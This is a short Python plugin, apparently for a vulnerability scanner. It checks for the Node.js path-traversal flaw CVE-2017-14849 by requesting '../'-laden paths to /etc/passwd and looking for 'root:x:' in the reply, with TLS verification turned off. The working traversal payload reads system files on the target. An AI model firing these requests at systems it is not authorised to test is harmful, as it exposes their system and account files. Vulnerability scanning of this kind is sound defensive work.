from lib.poc.dummy import *
import ssl


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    payload = "GET {} HTTP/1.1\r\n" + \
              "Host: {}\r\n".format(ip) + \
              "User-Agent: {}\r\n".format(GLOBAL_USER_AGENT) + \
              "Connection: close\r\n\r\n"

    try:
        for path in ['/../../../a/../../../../etc/passwd', '/static/../../../a/../../../../etc/passwd']:
            if service == 'https':
                ssl_context = ssl._create_unverified_context()
                reader, writer = await asyncio.open_connection(ip, port, ssl=ssl_context)
            else:
                reader, writer = await asyncio.open_connection(ip, port)

            writer.write(payload.format(path).encode())
            await writer.drain()
            data = await asyncio.wait_for(reader.read(200), 5)
            writer.close()
            try:
                await writer.wait_closed()    # application data after close notify (_ssl.c:2730)
            except Exception as e:
                pass

            if data.decode().find("root:x:") >= 0:
                ret = {
                    'alert_group': 'node.js path traversal CVE-2017-14849',
                    'affects': '{}://{}:{}'.format(service, ip, port),
                    'details': '{}\npath traversal vulnerability that affects Node.js version 8.5.0'.format(path)
                }
                return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 18888, 'HTTP', True, task_msg={})
    run_plugin_test(scan)
